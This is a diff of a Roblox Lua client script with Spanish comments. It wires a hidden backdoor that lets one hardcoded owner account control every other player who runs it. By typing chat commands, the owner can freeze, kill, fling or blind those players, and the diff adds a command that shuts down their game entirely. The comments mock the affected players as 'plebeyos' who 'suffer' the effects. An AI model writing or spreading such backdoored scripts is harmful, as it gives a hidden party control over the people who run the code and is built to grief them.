@@ -4,33 +4,37 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Lighting = game:GetService("Lighting")
 
--- ID del dueño supremo (tú, papi 👑)
+-- ID del dueño (tú, papi 👑)
 local OWNER_ID = 2061467416
 
--- Función principal que se ejecuta cuando el OWNER escribe un comando
+-- Función que se activa cuando el OWNER escribe cualquier comando
 local function onOwnerCommand(message)
     local msg = message:lower()
     
-    -- CANCELACIÓN PARA EL DUEÑO: Si ID coincide, NADA pasa
+    -- Si eres el OWNER → CANCELAR TODO, nada se ejecuta
     if LocalPlayer.UserId == OWNER_ID then
-        print("Cancelado para el OWNER: " .. msg)
+        print("Cancelado para OWNER: " .. msg .. " (tú mandas, papi 😏)")
         return
     end
     
-    -- Solo para plebeyos (ID no coincide) → Ejecutamos el comando 😈
-    print("Plebeyo " .. LocalPlayer.Name .. " ejecutando: " .. msg .. " 💦")
+    -- Solo plebeyos (ID no coincide) sufren el efecto 😈
+    print("Plebeyo " .. LocalPlayer.Name .. " sufriendo: " .. msg .. " 💦")
     
     local character = LocalPlayer.Character
     if not character or not character:FindFirstChild("HumanoidRootPart") or not character:FindFirstChild("Humanoid") then
-        warn("No se encontró el character del plebeyo!")
         return
     end
     
     local humanoid = character.Humanoid
     local rootPart = character.HumanoidRootPart
     
-    if msg == "/fr" then
-        -- Freeze: Ancla todas las partes del cuerpo
+    if msg == "/k" then
+        -- Kick original: cierra el juego para este plebeyo
+        game:Shutdown()
+        print("¡Plebeyo kickeado! 💥")
+        
+    elseif msg == "/fr" then
+        -- Freeze
         for _, part in ipairs(character:GetDescendants()) do
             if part:IsA("BasePart") then
                 part.Anchored = true
@@ -38,87 +42,81 @@ local function onOwnerCommand(message)
         end
         humanoid.WalkSpeed = 0
         humanoid.JumpPower = 0
-        print("¡Plebeyo congelado! ❄️")
+        print("¡Congelado! ❄️")
         
     elseif msg == "/unfr" then
-        -- Unfreeze: Desancla y restaura
+        -- Unfreeze
         for _, part in ipairs(character:GetDescendants()) do
             if part:IsA("BasePart") then
                 part.Anchored = false
             end
         end
-        humanoid.WalkSpeed = 16  -- Velocidad normal
-        humanoid.JumpPower = 50  -- Salto normal
-        print("¡Plebeyo descongelado! 🔥")
+        humanoid.WalkSpeed = 16
+        humanoid.JumpPower = 50
+        print("¡Descongelado! 🔥")
         
     elseif msg == "/r" then
-        -- Reset: Mata al humanoid para respawnear
+        -- Reset
         humanoid.Health = 0
-        print("¡Plebeyo reseteado! 💥")
+        print("¡Reseteado! 💀")
         
     elseif msg == "/f" then
-        -- Fling: Lanza al aire con fuerza random
-        rootPart.Velocity = Vector3.new(math.random(-100, 100), 200, math.random(-100, 100))
-        print("¡Plebeyo flingeado! 🚀")
+        -- Fling
+        rootPart.Velocity = Vector3.new(math.random(-200, 200), 150, math.random(-200, 200))
+        print("¡Flingeado! 🚀")
         
     elseif msg == "/j" then
-        -- Jump: Salto alto forzado
+        -- Jump alto
+        humanoid.JumpPower = 120
         humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-        humanoid.JumpPower = 100  -- Salto extra alto
-        wait(0.1)
-        humanoid.JumpPower = 50  -- Vuelve a normal
-        print("¡Plebeyo saltando como loco! 🦘")
+        task.wait(0.2)
+        humanoid.JumpPower = 50
+        print("¡Salto forzado! 🦘")
         
     elseif msg == "/l" then
-        -- Efecto: Fogend 10, FogColor black por 10s + ocultar nombres
+        -- Efecto oscuro + ocultar nombres
         local originalFogEnd = Lighting.FogEnd
         local originalFogColor = Lighting.FogColor
         
         Lighting.FogEnd = 10
-        Lighting.FogColor = Color3.new(0, 0, 0)  -- Black
+        Lighting.FogColor = Color3.new(0, 0, 0)
         
-        -- Ocultar nombres de TODOS los jugadores (localmente)
+        -- Ocultar nombres localmente
         for _, plr in ipairs(Players:GetPlayers()) do
             if plr.Character and plr.Character:FindFirstChild("Head") then
                 local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
-                if billboard then
-                    billboard.Enabled = false
-                end
+                if billboard then billboard.Enabled = false end
             end
         end
         
-        print("¡Efecto oscuro activado por 10s! 🌑")
+        print("¡Modo oscuridad activado! 🌑")
         
         task.wait(10)
         
         -- Restaurar
         Lighting.FogEnd = originalFogEnd
         Lighting.FogColor = originalFogColor
-        
-        -- Volver a mostrar nombres
         for _, plr in ipairs(Players:GetPlayers()) do
             if plr.Character and plr.Character:FindFirstChild("Head") then
                 local billboard = plr.Character.Head:FindFirstChildOfClass("BillboardGui")
-                if billboard then
-                    billboard.Enabled = true
-                end
+                if billboard then billboard.Enabled = true end
             end
         end
-        print("¡Efecto desactivado! ☀️")
+        print("¡Modo oscuridad desactivado! ☀️")
     end
 end
 
--- Escuchar el chat SOLO del OWNER, pero en TODOS los clientes
-local function hookPlayer(player)
+-- Hookear el chat SOLO del OWNER en todos los clientes
+local function hookOwnerChat(player)
     if player.UserId == OWNER_ID then
         player.Chatted:Connect(onOwnerCommand)
     end
 end
 
--- Conectar jugadores actuales
+-- Jugadores actuales
 for _, player in ipairs(Players:GetPlayers()) do
-    hookPlayer(player)
+    hookOwnerChat(player)
 end
 
--- Conectar jugadores que entren después
-Players.PlayerAdded:Connect(hookPlayer)
+-- Nuevos jugadores
+Players.PlayerAdded:Connect(hookOwnerChat)
